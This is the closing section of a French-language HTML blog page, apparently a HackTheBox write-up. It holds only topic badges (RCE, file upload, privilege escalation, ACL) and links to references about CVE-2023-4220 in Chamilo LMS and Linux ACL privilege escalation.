    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">RCE</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">FileUpload</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PrivEsc</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SudoMisconfig</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(14, 165, 233, 0.1); color: #0ea5e9; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">ACL</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(107, 114, 128, 0.1); color: #6b7280; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Linux</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(6, 182, 212, 0.1); color: #06b6d4; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">HackTheBox</span>
</div>

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Références utiles
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-4220" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2023-4220 - Chamilo LMS File Upload RCE
            </a>
        </li>
        <li>
            <a href="https://www.chamilo.org/security/" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Chamilo Security Advisories
            </a>
        </li>
        <li>
            <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Linux ACL Privilege Escalation Techniques
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
    <a href="{{ site.baseurl }}/fr/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Retour au blog
    </a>
</div>
